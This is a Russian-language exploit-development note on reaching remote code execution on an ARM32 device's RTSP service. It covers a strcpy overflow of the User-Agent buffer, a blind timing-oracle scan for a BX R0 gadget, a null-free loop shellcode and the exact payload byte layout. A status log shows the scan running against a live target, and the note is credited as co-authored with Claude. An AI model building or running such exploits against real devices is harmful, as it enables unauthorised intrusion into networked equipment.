# Ret2reg — прыжок через BX R0

---

## Проблема

Нужно выполнить shellcode в `ua_buf`, но мы не знаем **адрес ua_buf** в памяти (нет ASLR, но нет и `/proc/self/maps`). Стандартный подход — прыгнуть прямо на известный адрес ua_buf — невозможен без дизассемблера прошивки.

---

## Решение: регистр вместо адреса

По **AAPCS** (ARM Procedure Call Standard):
- Возвращаемое значение функции → `R0`
- Первый аргумент функции → `R0`
- `strcpy(dst, src)` возвращает `dst` (первый аргумент)

После `strcpy(ua_buf, user_agent_value)`:
```
R0 = ua_buf   ← AAPCS: возвращаемое значение = dst
```

Если сразу после этого произойдёт `BX R0` — CPU перейдёт на `ua_buf`.

---

## Поиск BX R0 гаджета

### Кодировка (ARM32 LE)

```
BX  R0  = \x10\xff\x2f\xe1    (null-free ✓)
BLX R0  = \x30\xff\x2f\xe1    (null-free ✓)
```

Оба нулевых байта нет → проходят через `strcpy`.

### Где искать

Мmaped регион `0x40000000–0x40F30000` (~15 MB):
- Подтверждён через timing oracle
- Весь mapped + executable (NX отсутствует)
- Содержит библиотеки и код RTSP-демона

### Слепое сканирование

```python
for addr in candidates:                          # 4-aligned, null-free
    payload = LOOP_SC + filler + addr_as_PC      # PC → addr
    send(payload)
    elapsed, tag = wait_for_restart()

    if tag == 'DEAD':   # >20s без рестарта
        print(f"BX R0 найден @ 0x{addr:08x}!")   # R0=ua_buf, LOOP крутится
        break
```

---

## Структура payload

```
[0   – 101]   LOOP_SC     — NOP×24 + B. + \x01\x01    (null-free, 102 байта)
[102 – 215]   b'B'×114    — локальные переменные        (null-free)
[216 – 247]   ARM_NOP×8   — R4–R11 = 0xe1a01001        (kernel-space, null-free)
[248 – 251]   gadget_addr — PC → BX R0                  (null-free, 4-aligned)
```

### Почему R4–R11 = ARM_NOP?

```
ARM_NOP = \x01\x10\xa0\xe1   →   LE word = 0xe1a01001   →   > 0xC0000000 = kernel space
```

Если R11 (frame pointer) = user-space адрес → CPU после краша обходит FP chain через всю память → ~21 сек → **ложный DEAD**.

Если R11 = kernel-space → немедленный kernel fault → fast HIT ~2.5 сек → чистый oracle.

---

## LOOP_SC — shellcode-маяк

```python
ARM_NOP  = b'\x01\x10\xa0\xe1'   # MOV R1,R1
ARM_LOOP = b'\xfe\xff\xff\xea'   # B . (прыжок на себя)

# 24 инструкции NOP + 1 LOOP + 2 байта выравнивания = 102 байта
LOOP_SC = ARM_NOP * 24 + ARM_LOOP + b'\x01\x01'
```

Если shellcode запустился → бесконечный цикл → сервис не рестартует → DEAD (>20s) = **RCE подтверждён**.

---

## Статус

```
[✅] LOOP_SC собран: 102 байта, null-free
[✅] Payload отлажен: R4-R11 = kernel-space, FP cascade устранён
[✅] Oracle работает: HIT=2.5s стабильно, ложных DEAD = 0
[🔄] Сканирование: 117/938 кандидатов, шаг 4–32 KB, DEAD не найден
[❌] RCE не подтверждён: BX R0 гаджет пока не найден
```

---

## Альтернативы если R0 ≠ ua_buf

Если между `strcpy` и `epilogue` есть ещё вызовы, R0 может быть перезаписан.

| Регистр | Контроль | Гаджет |
|---------|----------|--------|
| R0 | Возможен (AAPCS) | `BX R0` = `\x10\xff\x2f\xe1` |
| R4 | **Прямой** — bytes [216–219] payload | `BX R4` = `\x14\xff\x2f\xe1` |
| R1 | Возможен (второй аргумент strcpy) | `BX R1` = `\x11\xff\x2f\xe1` |

R4 гарантированно = `ARM_NOP` = `0xe1a01001` (kernel-space, не shellcode адрес).  
Чтобы R4 указывал на ua_buf, нужно знать его адрес — тот же круг.


---

*Co-authored with [Claude](https://claude.ai) (Anthropic)*
